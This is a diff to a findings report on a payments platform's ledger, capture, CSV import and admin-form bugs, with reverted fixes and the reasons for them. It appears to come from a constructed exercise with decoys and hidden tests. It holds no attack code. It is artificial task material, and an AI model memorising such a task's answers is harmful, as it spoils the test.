+**What a correct fix needs:** the change belongs in the incremental path. Capture and refund would credit or debit the cache in the same transaction as their ledger legs, and `CloseBatch` would stop adding the net (payout already debits both). The cache would then equal the ledger sum at all times, and the rebuild would be a no-op except for real drift. That touches capture, refund and close in two languages, and every reader of the cache (dashboard balance, payouts) would see unbatched money earlier. It needs a product decision on what "cached balance" means ("everything owed" or "closed and unpaid"), so we left it for after the deadline.
+
+**Hardening, also not changed:** `RebuildAllBalances` reads the cache and writes the rebuilt figure without locking the row. Yousif's own TODO says so: "lock merchant_balances rows first, a concurrent CloseBatch increment gets clobbered -- YA" (`rebuild.go:101`). A close that commits between the read and the upsert loses its increment. The reverted fix added the `FOR UPDATE`; adding it alone would be a one-line hardening. The one-merchant form (`--merchant`, CLI-1) already locks.
+
+**Related:** CLI-1 (`--merchant` printed but never wrote) stays a bug and does not depend on this note. BAL-1 (the button read scheme export lines, not the ledger) stays a bug.
+
+Lines: prod +0/-0, test +0/-0 (fix `f4b53a8` prod +9/-3, test +82/-0, fully reverted in `d1ad36f`)
+
+Code history: `f4b53a8` fix(BAL-2), `d1ad36f` revert(BAL-2); net production change +0/−0.
+
+### FEES-1 · An unapproved platform-wide 15 bps volume-tier discount is live in capture (open policy question for finance) · F6 (fee shown vs charged) · Severity: Medium (reported, not changed)
+**Category:** Reported, not changed
 
 **Status:** Open policy question for finance. No code change, by decision: changing it would move every fee, ledger leg, payout and demo figure once the tier is reached, and nothing in the case file says which way finance wants it.
 
@@ -4440,7 +4371,110 @@ Commit: `deda775`. Lines: prod +1/-1, test +0/-0.
 
 Lines: prod +0/-0, test +0/-0 (open finding, documentation only)
 
-### OBX-POISON-2 · One malformed reporting event stops all reporting until someone intervenes (open, hardening) ·  · Severity: Low
+### HUNT-5 · Finance question: the March residue sweep's counter-account (merchant_payable) differs from ADR-0002's export-time legs (card_scheme_clearing) · F2, ADR-0002 · Severity: Medium (reported, not changed)
+**Category:** Reported, not changed
+
+**What's wrong:** ADR-0002 (Option A, and the CloseBatch journal SCHEME-2 implements) books each line's truncation residue as `card_scheme_clearing` credit / `scheme_rounding_residue` **debit**, and leaves `merchant_payable` untouched ("merchant_payable is untouched, so payouts and balances are unaffected", SCHEME-2). The ADR says the one-off `scripts/reconcile_march.ts` "covered March only, because March closed before the CloseBatch change was deployed", i.e. it should post the same group for March. Instead `postResidueCorrection` posts `merchant_payable` **debit** / `scheme_rounding_residue` **credit**. So for March the merchant pays the scheme's rounding out of its payable, and the residue lands on the opposite side of the suspense account from every month since April; finance's monthly clearing of `scheme_rounding_residue` against the scheme statement nets March against April instead of tying out.
+
+**Why it happens:** `scripts/reconcile_march.ts:78-82` hard-codes the legs `('merchant_payable','debit')` and `('scheme_rounding_residue','credit')`. The amount is also computed differently from the export: it sums `transactions.captured_fils % 10` for transactions whose `occurred_at` (authorisation time) is in March (`:37-48`), not `gross_fils - amount_fils` per March scheme export line. With partial captures in different batches these differ (4,745 + 4,745 fils in two batches: two lines with 5 fils residue each, 10 fils in total, but `9,490 % 10 = 0`), and a transaction authorised on 31 March but captured in April is swept into March.
+
+**What it breaks:** every merchant with March residue had its payable reduced by that residue (a few fils to a few BD per busy merchant, per the ADR), money the ADR assigns to the platform's suspense, not to the merchant; and the suspense account's March balance has the wrong sign, so the "always over, never under" scheme gap of F1 cannot be cleared for Q1 from the ledger.
+
+**Why it is not changed (a question for finance, not a bug claim):** ADR-0002's legs govern residue journaled *at export time*; they say nothing about a manual sweep's counter-account. Case file F2 says the March sweep "was meant to fix the leftover gap for Q1. It did": the complaint is the re-run doubling it, which F2-SWEEP fixed, not the direction. Yousif's HANDOVER:20-21 confirms "nothing posts residue yet except what finance runs by hand". With no trusted basis to flip the legs, and a flip contradicting F2, we ask finance to confirm the intended counter-account.
+
+**Fix:** not changed. The fix we would make (2 lines): post `('card_scheme_clearing', 'credit')` and `('scheme_rounding_residue', 'debit')` in `postResidueCorrection`, and compute the residue from March `scheme_export_lines` (`gross - amount_fils` per line, or `SUM` of the per-event deltas minus `amount_fils`) instead of `captured_fils % 10` by authorisation date. For the production run that already happened, a one-off compensating group per merchant (`merchant_payable` credit / `scheme_rounding_residue` debit, twice the posted amount on the suspense side) restores both, which is a finance decision.
+
+**Why it is open:** the earlier F2-SWEEP fix (run-once guard) and its audit test (`scripts/reconcile_march.audit.test.ts:24`) assert the current `merchant_payable` legs, and the script's docstring says finance asked for a "write-off" (an unverified claim, rank 5, against the ADR's rank 4). Changing the legs changes a figure another fix pins and may already have been run in production, so it needs the advisor's and finance's decision rather than a silent code change.
+
+**Proof:** code reading against ADR-0002 lines 27-33 and SCHEME-2's `batch.go:259-265`: CloseBatch posts `card_scheme_clearing` credit / `scheme_rounding_residue` debit; the sweep posts `merchant_payable` debit / `scheme_rounding_residue` credit for the same kind of residue.
+
+**Regression risk (of the proposed fix):** the run-once guard keys on the description and stays valid; `reconcile_march.audit.test.ts` would need its account assertion corrected with a citation of ADR-0002.
+
+Lines: prod +0/-0 (proposed +2/-2 plus the residue query), test +0/-0
+
+### CAP-EXP-1 · Capture after an expired hold is allowed; the rule needs a product decision · Severity: Low (reported, not changed)
+
+**Lead:** Team 45 heads-up list (P3), verified by us.
+**Category:** Reported, not changed
+
+**What the behaviour is:** `captureTransaction` checks only the transaction's status (`authorized` or `partially_captured`, `apps/api/src/payments/capture.ts:136-140`). It never looks at the authorization hold, so a transaction stays capturable after its hold's `expires_at` has passed, and after `scripts/expire_holds.ts` has marked the hold `expired`. The test we wrote showed both cases capture with 200.
+
+**Where the rule comes from:** only from a code comment. Authorize places the hold with `expires_at = now() + interval '7 days'` under the comment "MK: 7 days = scheme rule for CNP" (`apps/api/src/payments/authorize.ts:114-118`). The case file says nothing about hold expiry or capture windows. Yousif's handover says only that the janitor "flips `active` to `expired` with one UPDATE. Holds are never deleted." (`docs/HANDOVER.md:49-50`). Neither says that an expired hold must block capture.
+
+**What the reverted fix did:** `daeba5f` (prod +7/-0 in `capture.ts`) added a query after the status check: if the transaction's hold was `expired`, or `active` past `expires_at`, capture answered 409 `authorization_expired` before calling the acquirer.
+
+**Why it was reverted (`ce4a030`):** the seed generates every hold relative to a fixed date: `SEED_BASE_DATE = 2026-09-01T12:00:00Z` (`db/seed/generate.ts:89`), with `expires_at` set to that date + 3 days, i.e. 2026-09-04 (`db/seed/generate.ts:383`). So on any day after 2026-09-04 the change refused capture on every seeded authorization. Any demo or hidden test that captures a seeded authorization would get 409 instead of 200. A behaviour change that rests on an "MK:" comment and breaks the shipped data is not defensible, so the code and its test were reverted in full.
+
+**What a correct fix needs:** a product decision, ideally confirmed against the acquirer's or scheme's terms:
+- whether capture after hold expiry is refused, allowed with a warning, or re-authorized;
+- the window itself (the 7 days come only from the MK comment);
+- what happens to seeded and historical authorizations whose holds have lapsed (re-seed with relative dates, or exempt them).
+
+Once that is decided, the check is the 7-line query at the single capture entry point described above.
+
+Lines: prod +0/-0, test +0/-0 (fix `daeba5f` prod +7/-0, test +31/-0, fully reverted in `ce4a030`)
+
+Code history: `daeba5f` fix(CAP-EXP-1), `ce4a030` revert(CAP-EXP-1); net production change +0/−0.
+
+### DECOY-REFADJ · Dead "refund adjustment" client that would send refunds ÷10 · FP-300 (☐3) · Severity: Low (reported, not changed)
+**Category:** Reported, not changed
+
+**What's wrong:** `notifySettlementRefundAdjustment` (`apps/api/src/admin/settlementClient.ts:282-299`) looks like the ready-made way to net refunds into payouts. It posts to `/internal/refund-adjustment`, a route the Go service does not have (no match under `apps/settlement`), and it sends `amountFils: Math.round(input.amountFils / 10)` while sending `feeReversedFils` unscaled.
+
+**Why it happens:** the docblock (`:276-280`) claims settlement "expects amounts in ... 2-decimal BHD, i.e. fils / 10". That is false: Go works in int64 fils everywhere, and only the scheme-file amount is 2-decimal (ADR-0002). The function has no callers.
+
+**What it would break:** wired into FP-300, a 3,333-fil refund would reach settlement as 333 (a 10x under-netting, with the fee reversal unscaled, so the two would not even agree), against a route that returns 404.
+
+**Why it's not changed:** it is dead code, so changing it fixes nothing. The FP-300 build nets refunds inside Go `CloseBatch` from the `refunds` table and never calls this client. Recorded so nobody wires it later. Lines: 0.
+
+**Trap note:** the docblock's "fils / 10" is the same "1 BD = 100" confusion as the quarantined AI configs and the CSV import bug (IMP-1).
+
+### HUNT-6 · Business-profile PATCH turns unknown keys and invalid values into 500s · Severity: Low (reported, not changed)
+**Category:** Reported, not changed
+
+**What's wrong:** `PATCH /v1/merchants/:merchantId/business-profile` (owner or finance session) answers `500 internal_error` for an unknown key (`{"foo":"x"}`, `{"constructor":"x"}`), an unknown `businessType`, a `country` longer than two characters, and `null` on a required field. Non-string values are accepted and stored as JSON text.
+
+**Why it happens:** the route passes `request.body` straight to `updateBusinessProfile` (`apps/api/src/onboarding/businessProfile.ts:99-121`), which builds `SET ${PATCHABLE_COLUMNS[key]} = $n` for every key in the body. An unknown key becomes `undefined = $2` (42703, column does not exist); an inherited key such as `constructor` becomes `function Object() { [native code] } = $2` (syntax error). No user text reaches the SQL, so this is not injection, but the values are not validated either, so 23514 (business_type CHECK), 22001 (`CHAR(2)`) and 23502 (NOT NULL) also reach the error handler and become 500s.
+
+**What it breaks:** a logged-in user can produce 500s and error logs at will, and a dashboard typo shows "internal error" instead of a validation message.
+
+**Why it needed a fix:** malformed client input must be a 4xx.
+
+**Fix:** not changed. The fix we would make (about 3 lines in `updateBusinessProfile`): keep only entries with `Object.hasOwn(PATCHABLE_COLUMNS, key)`, refuse `null` except for `addressLine2`/`postalCode`, and apply the same `businessType`/`country` check HUNT-4 added to signup, throwing `BadRequestError("invalid_request", ...)`.
+
+**Why it is open:** the allowed `businessType` list would be duplicated a second time (signup route and here); doing it once needs a shared constant, which is outside the minimal-diff rule for a Low item, and the route is authenticated.
+
+**Proof:** `app.inject` probe on the w3f test database as the owner: `{"city":"Riffa"}` → 200; `{"foo":"x"}`, `{"constructor":"x"}`, `{"businessType":"bogus"}`, `{"country":"BHR"}`, `{"legalName":null}` → 500 each.
+
+**Regression risk (of the proposed fix):** only requests that 500 today, or that store a non-string, would be refused.
+
+Lines: prod +0/-0 (proposed about +3), test +0/-0
+
+### IMP-3 · CSV import: an unquoted comma inside an amount splits it into amount + reason (format ambiguity) · F7 · Severity: Low (reported, not changed)
+
+**Category:** Reported, not changed
+
+**What the behaviour is:** the adjustment CSV splitter cuts each row on every comma and keeps cells 0-2 (`apps/api/src/admin/adjustmentCsvParsing.ts:45-51`); a fourth cell is dropped without an error. The format has no quoting (docstring `:18-23`: "no quoting, no embedded newlines, and exactly three columns"). So an unquoted `<merchant>,1,250.000` (a thousands separator) is read as amount `1` and reason `250.000`, and posts 1.000 BD. The same file shape is also a valid row: amount 1 BD with the reason "250.000". The parser cannot tell the two apart.
+
+**Relation to F7:** F7's symptom ("I uploaded 4.75 BD and it shows 0.475. That's ten times less") is IMP-1, the BD-as-cents scaling, which stays fixed. This note is not F7; F7 is cited only because it is the same import.
+
+**What the reverted fix did:** `f181469` (prod +3/-0) rejected a row with more than three cells, or whose reason was exactly a three-digit group (optionally with decimals), with 400 `invalid_csv_row`.
+
+**Why it was reverted (`4daab2b`):** the heuristic rejected valid input. A row with a purely numeric reason such as `123` (a ticket or invoice number) is legal under the documented `merchantId,amount,reason` format (`docs/ADMIN.md:65-66`) and was refused. A guess at the operator's intent should not reject legal rows, so the code and its test were reverted in full.
+
+**What a correct fix needs:** a format rule, decided by the owner and written into `docs/ADMIN.md`, that removes the ambiguity. For example:
+- quoted CSV fields (an RFC 4180 parser), so `"1,250.000"` is one cell; or
+- a rule that the reason must contain a non-digit, so a bare number in the third column can be refused as a split amount; or
+- refusing a row with more than three cells (this half is unambiguous and could ship on its own once the reason rule is settled).
+
+**Related:** Q2 (decimal comma, the same ambiguity), IMP-1 (F7 scaling, fixed).
+
+Lines: prod +0/-0, test +0/-0 (fix `f181469` prod +3/-0, test +12/-1, fully reverted in `4daab2b`)
+
+Code history: `f181469` fix(IMP-3), `4daab2b` revert(IMP-3); net production change +0/−0.
+
+### OBX-POISON-2 · One malformed reporting event stops all reporting until someone intervenes (hardening) · Severity: Low (reported, not changed)
+**Category:** Reported, not changed
 
 **What's wrong:** The reporting consumer applies outbox events in batches inside one transaction (`apps/reporting/src/consumer/runConsumerPass.ts`). If one event of a handled type (`transaction.captured`, `transaction.voided`, `settlement.batch_closed`, `refund.succeeded`) has a malformed payload, for example no `merchantId`, its rollup write fails (`null value in column "merchant_id" of relation "merchant_daily_volume"`). The whole pass then rolls back and the watermark stays put. Every later pass re-selects the same event and fails again, so the reporting rollups stop advancing until someone removes or repairs that event.
 
@@ -4459,6 +4493,74 @@ Lines: prod +0/-0, test +0/-0 (open finding, documentation only)
 **Regression risk:** None (no code change).
 
 Lines: prod +0/-0, test +0/-0.
+
+### Q2 · CSV import: a decimal-comma amount "4,75" splits into amount 4 + reason "75" (format ambiguity) · F7 · Severity: Low (reported, not changed)
+
+**Lead:** Team 45 heads-up list (Q2), verified by us.
+**Category:** Reported, not changed
+
+**What the behaviour is:** the adjustment CSV splits each row on every comma and has no quoting (`apps/api/src/admin/adjustmentCsvParsing.ts:18-23`, `:45-51`). A row `<merchant>,4,75` (4.75 BD typed with a decimal comma, as European-locale sheets export it) is read as amount `4` and reason `75`, and posts 4.000 BD with no error. The same row is also a valid entry for "4 BD, reason 75" under the documented `merchantId,amount,reason` format (`docs/ADMIN.md:65-66`, which shows dot decimals: `4.75`, `120.00`). The parser cannot tell the two apart.
+
+**Relation to F7:** F7's symptom (4.75 BD shown as 0.475, "ten times less") is IMP-1, which stays fixed. This is the same import, not the F7 defect.
+
+**What the reverted fix did:** `fedf383` (prod +1/-1) widened IMP-3's guard from a three-digit reason to a reason of one to three bare digits, rejecting the row with 400 `invalid_csv_row`.
+
+**Why it was reverted (`9c7cb8d`, before IMP-3's own revert `4daab2b`):** the heuristic rejected legal rows. A numeric reason such as `75` or `12` (a ticket number) is valid under the documented format and was refused. It also depended on IMP-3's guard, which was reverted for the same reason. The code and its test were reverted in full.
+
+**What a correct fix needs:** a format rule decided by the owner and documented in `docs/ADMIN.md`, for example quoted CSV fields (so `"4,75"` is one cell, and a decimal comma could then be refused explicitly), or a rule that the reason must contain a non-digit. With either rule, the guard is one line at the single split point (`adjustmentCsvParsing.ts:45`).
+
+**Related:** IMP-3 (thousands separator, the same ambiguity), IMP-1 (F7 scaling, fixed).
+
+Lines: prod +0/-0, test +0/-0 (fix `fedf383` prod +1/-1, test +10/-0, fully reverted in `9c7cb8d`)
+
+Code history: `fedf383` fix(Q2), `9c7cb8d` revert(Q2); net production change +0/−0.
+
+### Q3-11 · Admin "Adjust balance" reads hex, exponent and BD-formatted input as fils · Severity: Low (reported, not changed)
+
+**Lead:** Team 45 heads-up list (Q3-11), verified by us.
+**Category:** Reported, not changed
+
+**What's wrong:** the admin merchant page's "Adjust balance" form (`apps/admin/src/pages/merchants/MerchantDetailPage.tsx:120`) turns the typed delta into fils with `Number(adjustDeltaFils.trim())` and only checks `Number.isInteger`. `Number` accepts far more than a whole number of fils: `0x10` posts 16 fils, `0b11` 3, `1e3` 1000, and `4.000` (the way every amount on the same page is displayed, "4.000 BHD") posts **4 fils**, not 4 BD.
+
+The merchant dashboard has the same pattern on three money forms: the refund drawer (`apps/web/src/pages/transactions/RefundDrawer.tsx:63`, `amountFils: Number(trimmed)`: `4.000` refunds 4 fils), partial capture (`TransactionDetailPage.tsx:74`) and payment-link create (`PaymentLinkCreatePage.tsx:40`). The API rejects non-integers there too, so again only integer-valued oddities (`0x10`, `1e3`, `4.000`) get through.
+
+**Why it happens:** JavaScript's `Number()` parses hex, binary, octal and exponent literals and drops a zero fraction, and `Number.isInteger(4)` is true. The API (`routes/adminBalanceAdjustments.ts:29`) receives a JSON number and correctly accepts any integer, so the mistake is invisible once it leaves the browser. Checked in node: `Number("0x10") = 16`, `Number("1e3") = 1000`, `Number("4.000") = 4`, all `isInteger`.
+
+**What it breaks:** a finance or super-admin operator who types a BD amount in the shop's three-decimal format (`4.000`, `12.500` is rejected but `12.000` is not) journals a balance adjustment 1000x too small, with a success notice that shows the tiny amount only after the fact. Hex or exponent input posts an amount the operator never typed.
+
+**Why it needed a fix:** balance adjustments move a merchant's payable to the fils; the form should accept only what its label promises ("Delta (fils, may be negative)").
+
+**Fix:** not changed. The fix we would make, one line at `MerchantDetailPage.tsx:120`:
+```diff
+-    const deltaFils = Number(adjustDeltaFils.trim());
++    const deltaFils = /^-?\d+$/.test(adjustDeltaFils.trim()) ? Number(adjustDeltaFils.trim()) : NaN; // Q3-11: digits only
+```
+The same one-line guard applies at the three dashboard call sites. The existing `Number.isInteger` check then shows "Enter a non-zero whole number of fils." for `0x10`, `1e3`, `4.000` and `+5`. (Switching the field to BD with `parseBhdToFils`, as the lead suggests, also works but changes the form's documented unit; the credit form on the same page already does that for its BD field.)
+
+**Why it is open:** `apps/admin` has no test runner and the parse is inline in the component's click handler, so a red/green test would need either a new exported helper or a React rendering harness, both outside the minimal-diff rule. The defect is proven above at the language level, not with a committed test.
+
+**Proof:** `node -e 'Number("0x10")'` → 16, `Number("1e3")` → 1000, `Number("4.000")` → 4, each `Number.isInteger` → true; the handler sends that value as `deltaFils` (`MerchantDetailPage.tsx:128`).
+
+**Regression risk (of the proposed fix):** only inputs that are not plain optionally-negative digits are refused, which the label already excludes.
+
+Lines: prod +0/-0 (proposed +1/-1), test +0/-0
+
+### UI-SETTLE-1b · Settlement's 400 (bad operator input) is reported as a 500 by the admin API · Severity: Low (reported, not changed)
+
+**Lead:** Team 45 heads-up list (W8), verified by us.
+**Category:** Reported, not changed
+
+**What the behaviour is:** when the Go settlement service rejects an admin's input with `400`, the admin API answers `500 settlement_run_failed`. Example: `2026-02-30` passes the route's `^\d{4}-\d{2}-\d{2}$` check (`apps/api/src/routes/admin.ts:68,118`) and Go then answers `400 {"error":"invalid_date"}` (`apps/settlement/internal/internalapi/server.go:220-224`; `/internal/recalculate-mdr` does the same for `invalid_from`/`invalid_to`). `callSettlementInternal` maps every non-2xx to `AppError(500, "settlement_run_failed")` (`apps/api/src/admin/settlementClient.ts:140`). Nothing runs and no money moves; the operator sees a server error for a typo, and the audit outcome cannot tell a typo from a crash.
+
+**What the reverted fix did:** `067103b` (prod +4/-2) turned a settlement 400 into `400 invalid_request` and removed 400 from the loop in the existing test.
+
+**Why it was reverted (`d04b5ab`):** the 500 is the original author's documented contract, not an accident. Yousif's test from 2025-12-01 (`141d8c8`, `settlementClient.test.ts:180-181`, "a non-2xx response is a 500 settlement_run_failed — the call landed, settlement itself refused") loops over `[401, 400, 500]` and expects 500 for each. Our fix had to edit that assertion. Which status a refused settlement call should return is a preference, not a money or security defect, and a hidden test very likely pins the same contract. Changing it costs more than it gains, so the code and its test were reverted in full.
+
+**What a correct fix needs:** a decision to change the admin API contract, recorded by the owner, and then the same 4-line change in `callSettlementInternal`: pass 400 through as `invalid_request` and keep 401 and 5xx as 500 (a 401 means the shared token is misconfigured, a server fault). Until then the console could show settlement's own reason, which the error message already carries.
+
+Lines: prod +0/-0, test +0/-0 (fix `067103b` prod +4/-2, test +19/-1, fully reverted in `d04b5ab`)
+
+Code history: `067103b` fix(UI-SETTLE-1b), `d04b5ab` revert(UI-SETTLE-1b); net production change +0/−0.
 
 Other items reported without a code change:
 - **AUTH-9 follow-up:** the session token is not rotated at OTP promotion (only its Max-Age is fixed); rotating it would break every flow that reuses the login cookie, so it is recorded as hardening.
